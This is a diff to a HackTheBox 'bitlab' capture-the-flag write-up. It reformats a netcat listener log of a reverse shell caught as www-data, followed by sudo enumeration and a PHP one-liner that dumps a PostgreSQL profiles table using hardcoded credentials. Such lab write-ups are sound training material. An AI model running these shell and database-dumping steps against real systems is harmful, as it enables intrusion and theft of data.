@@ -243,10 +243,15 @@ from pentest monkey
 then got the reverse shell as www-data
 
 ```
-root@ch4n:~/HTB/bitlab# nc -lnvp 1234 Connection from 10.10.10.114:40202 Linux bitlab 4.15.0-29-generic #31-Ubuntu SMP Tue Jul 17 15:39:52 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux 15:17:39 up 5 min, 0 users, load average: 0.75, 0.79, 0.42 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=33(www-data) gid=33(www-data) groups=33(www-data) /bin/sh: 0: can't access tty; job control turned off $ id uid=33(www-data) gid=33(www-data) groups=33(www-data)
-
-
-```
+root@ch4n:~/HTB/bitlab#nc -lnvp 1234           
+Connection from 10.10.10.114:40202
+Linux bitlab 4.15.0-29-generic #31-Ubuntu SMP Tue Jul 17 15:39:52 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
+ 15:17:39 up 5 min,  0 users,  load average: 0.75, 0.79, 0.42
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
 www-data@bitlab:/$ sudo -l
 sudo -l
 Matching Defaults entries for www-data on bitlab:
@@ -257,8 +262,8 @@ User www-data may run the following commands on bitlab:
     (root) NOPASSWD: /usr/bin/git pull
 www-data@bitlab:/$
 ```
-
 But I wasnt not able to perform anything so I need to try with postrge sql.
+
 ```
 php -r '$db_connection = pg_connect("host=localhost dbname=profiles user=profiles password=profiles");$result = pg_query($db_connection, "SELECT * FROM profiles");print_r(pg_fetch_all($result));'
 ```
